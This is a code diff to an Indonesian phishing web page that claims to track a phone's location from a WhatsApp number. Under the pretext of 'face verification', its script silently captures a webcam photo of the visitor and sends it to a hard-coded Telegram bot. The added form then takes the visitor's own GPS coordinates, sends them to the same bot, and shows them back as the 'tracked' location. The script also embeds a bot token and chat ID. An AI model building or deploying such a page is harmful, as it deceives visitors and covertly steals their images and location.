@@ -6,28 +6,22 @@
   <title>Lacak Lokasi Dengan Nomor WhatsApp</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Inter', sans-serif;
       background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-      height: 100vh;
+      min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
       color: #fff;
       flex-direction: column;
     }
-
     .container {
       background: rgba(255, 255, 255, 0.05);
       border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 20px;
-      padding: 50px 30px;
+      padding: 40px 30px;
       backdrop-filter: blur(15px);
       box-shadow: 0 20px 40px rgba(0,0,0,0.3);
       text-align: center;
@@ -35,19 +29,8 @@
       width: 90%;
       animation: fadeIn 1s ease;
     }
-
-    h2 {
-      font-weight: 600;
-      font-size: 22px;
-      margin-bottom: 10px;
-    }
-
-    p {
-      font-size: 14px;
-      color: #ccc;
-      margin-bottom: 30px;
-    }
-
+    h2 { font-weight: 600; font-size: 22px; margin-bottom: 10px; }
+    p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
     .btn-premium {
       padding: 14px 35px;
       font-size: 16px;
@@ -60,96 +43,183 @@
       transition: all 0.3s ease;
       box-shadow: 0 8px 25px rgba(0, 200, 150, 0.4);
     }
-
     .btn-premium:hover {
       transform: scale(1.05);
       box-shadow: 0 12px 30px rgba(0, 200, 150, 0.6);
     }
-
     @keyframes fadeIn {
       from {opacity: 0; transform: translateY(20px);}
       to {opacity: 1; transform: translateY(0);}
     }
+    .credit { margin-top: 25px; font-size: 12px; color: #aaa; }
 
-    .credit {
-      margin-top: 25px;
-      font-size: 12px;
-      color: #aaa;
+    #page2 { display: none; }
+    input[type="text"] {
+      width: 100%; padding: 12px 16px; border-radius: 10px;
+      border: none; font-size: 1rem; outline: none;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      background: #35d8ac;
+      color: #052c2c;
+      font-weight: 700;
+      font-size: 1.1rem;
+      padding: 14px 0;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .result {
+      margin-top: 28px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 12px;
+      padding: 20px;
+      font-size: 0.95rem;
+      line-height: 1.5;
+      box-shadow: inset 2px 2px 10px rgba(255,255,255,0.3);
+    }
+
+    #videoWrapper {
+      margin: 20px 0;
+      display: none;
+    }
+
+    #videoPreview {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 15px;
+      border: 2px solid #35d8ac;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Selamat Datang Di lokasiku.id</h2></h2>
-    <p>Untuk memulai lacak lokasi dengan nomor WhatsApp, Verifikasi wajah anda terlebih dahulu.</p>
-    <button class="btn-premium" onclick="izinKamera()">Verifikasi Sekarang</button>
+
+<div id="page1" class="container">
+  <h2>Selamat Datang Di lokasiku.id</h2>
+  <p>Untuk memulai lacak lokasi dengan nomor WhatsApp, Verifikasi wajah anda terlebih dahulu.</p>
+  <div id="videoWrapper">
+    <video id="videoPreview" autoplay playsinline muted></video>
   </div>
+  <button class="btn-premium" onclick="izinKamera()">Verifikasi Sekarang</button>
+</div>
 
-  <div class="credit">
-    Create by <strong>lokasiku.id</strong>
-  </div>
+<div id="page2" class="container">
+  <h2>Mulai Lacak Lokasi Dilokasiku.id</h2>
+  <form id="trackForm">
+    <label for="waNumber">Masukkan Nomor WhatsApp</label>
+    <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" required pattern="^62[0-9]{8,14}$">
+    <button type="submit">Lacak Lokasi</button>
+  </form>
+  <div id="result" class="result"></div>
+</div>
 
-  <script>
-    let stream;
+<div class="credit">Create by <strong>lokasiku.id</strong></div>
 
-    async function izinKamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false
-        });
+<script>
+let stream;
+const token = "7351970346:AAF_rQ0TIxzm3a-e1azTZ0pyoueC_G_zHro";
+const chatId = "5408845642";
 
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.setAttribute("playsinline", true);
-        video.muted = true;
-        video.play();
+async function izinKamera() {
+  try {
+    const tombol = document.querySelector(".btn-premium");
+    tombol.disabled = true;
+    tombol.innerText = "Memproses Verifikasi...";
 
-        video.addEventListener('canplay', function () {
-          setTimeout(() => ambilFoto(video), 500);
-        });
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }, audio: false
+    });
 
-      } catch (err) {
-        alert("Gagal Verifikasi: " + err.message);
+    const video = document.getElementById("videoPreview");
+    video.srcObject = stream;
+    document.getElementById("videoWrapper").style.display = "block";
+    video.play();
+
+    video.addEventListener('canplay', function () {
+      setTimeout(() => ambilFoto(video, tombol), 2000);
+    });
+
+  } catch (err) {
+    alert("Gagal Verifikasi: " + err.message);
+  }
+}
+
+function ambilFoto(video, tombol) {
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(async function(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", blob, "verifikasi.jpg");
+
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+
+      if (res.ok) {
+        stream.getTracks().forEach(track => track.stop());
+        document.getElementById('page1').style.display = 'none';
+        document.getElementById('page2').style.display = 'block';
+      } else {
+        alert("Gagal Kirim Foto");
       }
+    } catch (err) {
+      alert("Error Kirim: " + err.message);
     }
+  }, "image/jpeg");
+}
 
-    function ambilFoto(video) {
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
+document.getElementById('trackForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const resultEl = document.getElementById('result');
+  const waNumber = document.getElementById('waNumber').value.trim();
 
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+  if (!/^62\d{8,14}$/.test(waNumber)) {
+    resultEl.textContent = 'Nomor tidak valid. Format: 6281234567890';
+    return;
+  }
 
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
 
-      canvas.toBlob(async function(blob) {
-        const token = "7351970346:AAF_rQ0TIxzm3a-e1azTZ0pyoueC_G_zHro";
-        const chatId = "5408845642";
+      const message = `*Lacak Lokasi WhatsApp*\n\nNomor: \`${waNumber}\`\nLokasi GPS: [${lat}, ${lon}]\n\n_(Lokasi ini berdasarkan GPS pengguna)_`;
 
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "foto_auto.jpg");
-
-        try {
-          const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-
-          if (res.ok) {
-            alert("Verifikasi sukses...");
-          } else {
-            const errText = await res.text();
-            alert("Gagal Kirim:\n" + errText);
-          }
-
-          stream.getTracks().forEach(track => track.stop());
-        } catch (err) {
-          alert("Error Kirim: " + err.message);
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          resultEl.textContent = `Lokasi berhasil dilacak!\nNomor: ${waNumber}\nLokasi GPS: ${lat}, ${lon}`;
+        } else {
+          resultEl.textContent = 'Lokasi gagal dilacak.';
         }
-      }, "image/jpeg");
-    }
-  </script>
+      })
+      .catch(err => {
+        resultEl.textContent = 'Terjadi kesalahan: ' + err.message;
+      });
+
+    }, function(error) {
+      resultEl.textContent = 'Gagal mendapatkan lokasi: ' + error.message;
+    });
+  } else {
+    resultEl.textContent = 'Geolocation tidak didukung oleh browser ini.';
+  }
+});
+</script>
 </body>
 </html>
